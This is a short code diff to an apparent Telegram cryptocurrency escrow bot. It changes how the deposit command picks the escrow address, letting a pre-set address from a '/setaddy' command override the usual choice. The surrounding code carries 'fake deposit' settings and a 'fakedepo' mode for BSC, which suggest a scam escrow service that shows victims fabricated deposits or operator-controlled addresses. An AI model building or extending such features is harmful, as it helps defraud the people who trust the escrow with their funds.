@@ -3278,8 +3278,14 @@ async def deposit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     fake_deposit_network = escrow_roles[chat_id].get('fake_deposit_network')
     fake_deposit_address = escrow_roles[chat_id].get('fake_deposit_address')
     
-    # Determine escrow address and network label based on network
-    if token == "USDT":
+    # Use pre-set address from /setaddy if available, otherwise randomly select
+    pre_set_address = escrow_roles[chat_id].get('escrow_address')
+    
+    if pre_set_address:
+        # Address was already set via /setaddy - use it directly
+        escrow_address = pre_set_address
+        network_label = network
+    elif token == "USDT":
         if network == "BSC":
             # Check if fakedepo is enabled for BSC
             if fake_deposit_enabled and fake_deposit_network == "BSC":
